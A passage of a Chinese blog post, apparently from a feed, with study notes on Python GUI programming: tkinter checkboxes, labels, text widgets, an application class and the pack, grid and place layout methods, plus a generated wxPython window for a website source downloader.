punctuation">.</span> <span class="token punctuation">)</span><span class="token comment"># 在python3中，复选框的定义方式发生了略微改变</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>复选框</strong>：(Checkbutton) 是为了返回多个选项值的交互控件，通常不直接触发函数的执行。该控件除具有共有属性外，还具有显示文本（text）、返回变量（variable）、选中返回值（onvalue）和未选中默认返回值（offvalue）等重要属性。返回变量variable=var 通常可以预先逐项分别声明变量的类型var=IntVar() (默认)或 var=StringVar(), 在所调用的函数中方可分别调用 var.get()方法 取得被选中实例的 onvalue或offvalue值。复选框实例通常还可分别利用 select()、deselect()和 toggle() 方法对其进行选中、清除选中和反选操作。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#简单样例：</span><span class="token keyword">import</span> tkinter<span class="token punctuation">.</span>messagebox<span class="token keyword">import</span> tkintertop <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>CheckVar1 <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>IntVar<span class="token punctuation">(</span><span class="token punctuation">)</span>CheckVar2 <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>IntVar<span class="token punctuation">(</span><span class="token punctuation">)</span>C1 <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Checkbutton<span class="token punctuation">(</span>top<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"RUNOOB"</span><span class="token punctuation">,</span> variable<span class="token operator">=</span>CheckVar1<span class="token punctuation">,</span>onvalue<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> offvalue<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span>C2 <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Checkbutton<span class="token punctuation">(</span>top<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"GOOGLE"</span><span class="token punctuation">,</span> variable<span class="token operator">=</span>CheckVar2<span class="token punctuation">,</span>onvalue<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> offvalue<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span>C1<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>C2<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>top<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Python-Tkinter-标签控件（Label）及消息控件（Message）"><a href="#Python-Tkinter-标签控件（Label）及消息控件（Message）" class="headerlink" title="Python Tkinter 标签控件（Label）及消息控件（Message）"></a>Python Tkinter 标签控件（Label）及消息控件（Message）</h4><p>Python Tkinter 标签控件（Label）指定的窗口中显示的文本和图像。如果需要使用一行或多行且不应该被用户更改的标签控件需要用label控件。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">w <span class="token operator">=</span> Label <span class="token punctuation">(</span> master<span class="token punctuation">,</span> option<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">)</span><span class="token comment"># option 可选项内容与Button的可选项内容相近，但也有wraplength（标签文本显示行数）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#一个简单样例：</span><span class="token keyword">import</span> tkinter <span class="token keyword">as</span> tkroot <span class="token operator">=</span> tk<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>w <span class="token operator">=</span> tk<span class="token punctuation">.</span>Label<span class="token punctuation">(</span>root<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"Hello RUNOOB!"</span><span class="token punctuation">)</span>w<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>标签（Label）</strong>和 <strong>消息（Message）</strong>：除了单行与多行的不同外，属性和用法基本一致，用于呈现文本信息。</p><p>值得注意的是：属性text通常用于实例在第一次呈现时的固定文本，而如果需要在程序执行后发生变化，则可以使用下列方法之一实现：</p><p>1、用控件实例的configure()方法来改变属性text的值，可使显示的文本发生变化；</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tkinter<span class="token keyword">import</span> time<span class="token keyword">def</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      timestr <span class="token operator">=</span> time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%H:%M:%S"</span><span class="token punctuation">)</span> <span class="token comment"># 获取当前的时间并转化为字符串</span>      lb<span class="token punctuation">.</span>configure<span class="token punctuation">(</span>text<span class="token operator">=</span>timestr<span class="token punctuation">)</span>   <span class="token comment"># 重新设置标签文本</span>      root<span class="token punctuation">.</span>after<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span>gettime<span class="token punctuation">)</span> <span class="token comment"># 每隔1s调用函数 gettime 自身获取时间</span>root <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'时钟'</span><span class="token punctuation">)</span>lb <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Label<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span>fg<span class="token operator">=</span><span class="token string">'blue'</span><span class="token punctuation">,</span>font<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"黑体"</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lb<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>gettime<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2、先定义一个tkinter的内部类型变量var=StringVar() 的值也可以使显示文本发生变化。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tkinter<span class="token keyword">import</span> time<span class="token keyword">def</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      var<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%H:%M:%S"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 获取当前时间</span>      root<span class="token punctuation">.</span>after<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span>gettime<span class="token punctuation">)</span>   <span class="token comment"># 每隔1s调用函数 gettime 自身获取时间</span>root <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'时钟'</span><span class="token punctuation">)</span>var<span class="token operator">=</span>tkinter<span class="token punctuation">.</span>StringVar<span class="token punctuation">(</span><span class="token punctuation">)</span>lb <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Label<span class="token punctuation">(</span>root<span class="token punctuation">,</span>textvariable<span class="token operator">=</span>var<span class="token punctuation">,</span>fg<span class="token operator">=</span><span class="token string">'blue'</span><span class="token punctuation">,</span>font<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"黑体"</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lb<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>gettime<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Python-Tkinter-文本组件-Text"><a href="#Python-Tkinter-文本组件-Text" class="headerlink" title="Python Tkinter 文本组件 (Text)"></a>Python Tkinter 文本组件 (Text)</h4><img src="C:\Users\888888\AppData\Roaming\Typora\typora-user-images\1657025434153.png"  /><p> 上表位置的取值可为整数，浮点数或END（末尾），例如0.0表示第0列第0行</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> time<span class="token keyword">import</span> datetime<span class="token keyword">def</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>       s<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\n'</span>       txt<span class="token punctuation">.</span>insert<span class="token punctuation">(</span>END<span class="token punctuation">,</span>s<span class="token punctuation">)</span>       root<span class="token punctuation">.</span>after<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span>gettime<span class="token punctuation">)</span>  <span class="token comment"># 每隔1s调用函数 gettime 自身获取时间</span>root<span class="token operator">=</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>geometry<span class="token punctuation">(</span><span class="token string">'320x240'</span><span class="token punctuation">)</span>txt<span class="token operator">=</span>Text<span class="token punctuation">(</span>root<span class="token punctuation">)</span>txt<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>gettime<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><strong>输入框（Entry）</strong>：通常作为功能比较单一的接收单行文本输入的控件，虽然也有许多对其中文本进行操作的方法，但通常用的只有取值方法get()和用于删除文本的delete(起始位置，终止位置)，例如：清空输入框为delete(0，END)。</li></ul><h3 id="GUI应用程序类的通常写法"><a href="#GUI应用程序类的通常写法" class="headerlink" title="GUI应用程序类的通常写法"></a>GUI应用程序类的通常写法</h3><p>通过类application组织整个GUI程序，类application及继承了frame，及通过继承拥有了父类的特性。通过构造函数<code>_init_</code>()初始化窗口中的对象，通过createwidgets()方法创建窗口中的对象。</p><p>Frama框架是一个tkinter组件，表示一个矩形的区域。frame一般作为容器使用，可以放置其他组件，从而实现复杂的布局。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tkinter <span class="token keyword">as</span> tk<span class="token keyword">class</span> <span class="token class-name">Application</span><span class="token punctuation">(</span>tk<span class="token punctuation">.</span>Frame<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> master<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>master<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>master <span class="token operator">=</span> master        self<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>create_widgets<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">create_widgets</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>hi_there <span class="token operator">=</span> tk<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>hi_there<span class="token punctuation">[</span><span class="token string">"text"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Hello World\n(click me)"</span>        self<span class="token punctuation">.</span>hi_there<span class="token punctuation">[</span><span class="token string">"command"</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>say_hi        self<span class="token punctuation">.</span>hi_there<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>side<span class="token operator">=</span><span class="token string">"top"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>quit <span class="token operator">=</span> tk<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"QUIT"</span><span class="token punctuation">,</span> fg<span class="token operator">=</span><span class="token string">"red"</span><span class="token punctuation">,</span>                              command<span class="token operator">=</span>self<span class="token punctuation">.</span>master<span class="token punctuation">.</span>destroy<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>quit<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>side<span class="token operator">=</span><span class="token string">"bottom"</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">say_hi</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hi there, everyone!"</span><span class="token punctuation">)</span>root <span class="token operator">=</span> tk<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>app <span class="token operator">=</span> Application<span class="token punctuation">(</span>master<span class="token operator">=</span>root<span class="token punctuation">)</span>app<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="几何管理（控件布局）"><a href="#几何管理（控件布局）" class="headerlink" title="几何管理（控件布局）"></a>几何管理（控件布局）</h3><p>Tkinter控件有特定的几何状态管理方法，管理整个控件区域组织，以下是Tkinter公开的几何管理类：包、网格、位置</p><table><thead><tr><th>几何方法</th><th>描述</th></tr></thead><tbody><tr><td>pack()</td><td>包装；</td></tr><tr><td>grid()</td><td>网格；</td></tr><tr><td>place()</td><td>位置；</td></tr></tbody></table><h4 id="Pack-布局方式："><a href="#Pack-布局方式：" class="headerlink" title="Pack()布局方式："></a>Pack()布局方式：</h4><p>Pack()方法： 是一种简单的布局方法，如果不加参数的默认方式，将按布局语句的先后，以最小占用空间的方式自上而下地排列控件实例，并且保持控件本身的最小尺寸。</p><p>使用pack()方法可设置 fill、side 等属性参数。</p><table><thead><tr><th>pack()函数的属性</th><th>取值的对应意义</th></tr></thead><tbody><tr><td>fill=X/y/BOTH</td><td>允许控件向水平方向、垂直方向或二维伸展填充未被占用控件</td></tr><tr><td>side=left/right/bottom</td><td>表示本控件实例的布局相对于下一个控件实例的方位</td></tr></tbody></table><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> tkinter <span class="token keyword">import</span>  <span class="token operator">*</span>root <span class="token operator">=</span> Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>lbred <span class="token operator">=</span> Label<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"Red"</span><span class="token punctuation">,</span>fg<span class="token operator">=</span><span class="token string">"Red"</span><span class="token punctuation">,</span>relief<span class="token operator">=</span>GROOVE<span class="token punctuation">)</span>lbred<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>lbgreen <span class="token operator">=</span> Label<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"绿色"</span><span class="token punctuation">,</span>fg<span class="token operator">=</span><span class="token string">"green"</span><span class="token punctuation">,</span>relief<span class="token operator">=</span>GROOVE<span class="token punctuation">)</span>lbgreen<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>side<span class="token operator">=</span>RIGHT<span class="token punctuation">)</span>lbblue <span class="token operator">=</span> Label<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"蓝"</span><span class="token punctuation">,</span>fg<span class="token operator">=</span><span class="token string">"blue"</span><span class="token punctuation">,</span>relief<span class="token operator">=</span>GROOVE<span class="token punctuation">)</span>lbblue<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>fill<span class="token operator">=</span>X<span class="token punctuation">)</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="grid-布局方式："><a href="#grid-布局方式：" class="headerlink" title="grid()布局方式："></a>grid()布局方式：</h4><p><strong>grid()方法</strong>：是基于网格的布局。先虚拟一个二维表格，再在该表格中布局控件实例。由于在虚拟表格的单元中所布局的控件实例大小不一，单元格也没有固定或均一的大小，因此其仅用于布局的定位。pack()方法与grid()方法不能混合使用。<br> <strong>grid()方法常用布局参数如下：</strong></p><ul><li> <strong>column:</strong> 控件实例的起始列，最左边为第0列。</li><li> <strong>columnspan:</strong> 控件实例所跨越的列数，默认为1列。</li><li> <strong>ipadx,ipady:</strong> 控件实例所呈现区域内部的像素数，用来设置控件实例的大小。</li><li> <strong>padx,pady:</strong> 控件实例所占据空间像素数，用来设置实例所在单元格的大小。</li><li> <strong>row:</strong> 控件实例的起始行，最上面为第0行。</li><li> <strong>rowspan:</strong> 控件实例的起始行数，默认为1行。</li></ul><h4 id="place-布局方法："><a href="#place-布局方法：" class="headerlink" title="place()布局方法："></a>place()布局方法：</h4><p><strong>place()方法</strong>：根据控件实例在父容器中的绝对或相对位置参数进行布局。其常用布局参数如下：</p><ul><li><strong>x,y：</strong>控件实例在根窗体中水平和垂直方向上的其实位置（单位为像素）。注意，根窗体左上角为0,0,水平向右，垂直向下为正方向。</li><li><strong>relx,rely：</strong>控件实例在根窗体中水平和垂直方向上起始布局的相对位置。即相对于根窗体宽和高的比例位置，取值在<code>0.0~1.0</code>之间。</li><li><strong>height,width：</strong>控件实例本身的高度和宽度（单位为像素）。</li><li><strong>relheight,relwidth：</strong>控件实例相对于根窗体的高度和宽度比例，取值在<code>0.0~1.0</code>之间。</li><li>利用place()方法配合relx,rely和relheight,relwidth参数所得的到的界面可自适应根窗体尺寸的大小。place()方法与grid()方法可以混合使用。如下例子：利用place()方法排列消息（多行标签）。</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#参考样例：</span><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span>root <span class="token operator">=</span> Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>geometry<span class="token punctuation">(</span><span class="token string">'320x240'</span><span class="token punctuation">)</span>msg1 <span class="token operator">=</span> Message<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token triple-quoted-string string">'''我的水平起始位置相对窗体 0.2，垂直起始位置为绝对位置 80 像素，我的高度是窗体高度的0.4，宽度是200像素'''</span><span class="token punctuation">,</span>relief<span class="token operator">=</span>GROOVE<span class="token punctuation">)</span>msg1<span class="token punctuation">.</span>place<span class="token punctuation">(</span>relx<span class="token operator">=</span><span class="token number">0.2</span><span class="token punctuation">,</span>y<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">,</span>relheight<span class="token operator">=</span><span class="token number">0.4</span><span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">200</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Wxpython"><a href="#Wxpython" class="headerlink" title="Wxpython"></a>Wxpython</h2><blockquote><p>Wxpython这个是我最后采用的gui库，倒不是因为有多大去别，主要是我找到了一个自动生成Wxpython的代码段的小程序，我最后选择了wxpython。</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding:utf-8 -*-</span><span class="token keyword">import</span> wx<span class="token punctuation">.</span>lib<span class="token punctuation">.</span>agw<span class="token punctuation">.</span>hyperlink <span class="token keyword">as</span> lib_hyperlink<span class="token keyword">import</span> wx<span class="token keyword">class</span> <span class="token class-name">Frame</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>Frame<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        wx<span class="token punctuation">.</span>Frame<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> title<span class="token operator">=</span><span class="token string">'网站源代码下载器'</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">800</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'frame'</span><span class="token punctuation">,</span>style<span class="token operator">=</span><span class="token number">541072384</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>qdck <span class="token operator">=</span> wx<span class="token punctuation">.</span>Panel<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>Centre<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an1 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">350</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">)</span><span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">'下载'</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'button'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an1<span class="token punctuation">.</span>SetAuthNeeded<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an1<span class="token punctuation">.</span>Bind<span class="token punctuation">(</span>wx<span class="token punctuation">.</span>EVT_BUTTON<span class="token punctuation">,</span>self<span class="token punctuation">.</span>an1_anbdj<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bjk1 <span class="token operator">=</span> wx<span class="token punctuation">.</span>TextCtrl<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">)</span><span class="token punctuation">,</span>value<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'text'</span><span class="token punctuation">,</span>style<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bjk1<span class="token punctuation">.</span>SetMaxLength<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bq1 <span class="token operator">=</span> wx<span class="token punctuation">.</span>StaticText<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">365</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">235</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">'请输入需要下载的链接'</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'staticText'</span><span class="token punctuation">,</span>style<span class="token operator">=</span><span class="token number">2321</span><span class="token punctuation">)</span>        bq1_字体 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Font<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">74</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">700</span><span class="token punctuation">,</span><span class="token boolean">False</span><span class="token punctuation">,</span><span class="token string">'Microsoft YaHei UI'</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bq1<span class="token punctuation">.</span>SetFont<span class="token punctuation">(</span>bq1_字体<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1 <span class="token operator">=</span> lib_hyperlink<span class="token punctuation">.</span>HyperLinkCtrl<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">380</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'staticText'</span><span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">'使用说明'</span><span class="token punctuation">,</span>URL<span class="token operator">=</span><span class="token string">'https://im-so-scared-2.gitee.io/shier_jinghuang/'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1<span class="token punctuation">.</span>SetToolTip<span class="token punctuation">(</span>wx<span class="token punctuation">.</span>ToolTip<span class="token punctuation">(</span><span class="token string">'使用说明'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        cjljkL1_字体 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Font<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">70</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">,</span><span class="token string">'Microsoft YaHei UI'</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1<span class="token punctuation">.</span>SetFont<span class="token punctuation">(</span>cjljkL1_字体<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1<span class="token punctuation">.</span>SetForegroundColour<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">an1_anbdj</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment">#print('an1,按钮被单击')</span>        <span class="token keyword">pass</span><span class="token keyword">class</span> <span class="token class-name">myApp</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>App<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span>  <span class="token function">OnInit</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>frame <span class="token operator">=</span> Frame<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>frame<span class="token punctuation">.</span>Show<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app <span class="token operator">=</span> myApp<span class="token punctuation">(</span><span class="token punctuation">)</span>    app<span class="token punctuation">.</span>MainLoop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Python的GUI编程和tkinter，Wxpython&quot;&gt;&lt;a href=&quot;#Python的GUI编程和tkinter，Wxpython&quot; class=&quot;headerlink&quot; title=&quot;Python的GUI编程和tkinter，Wxpython&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://shierjinghuang.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
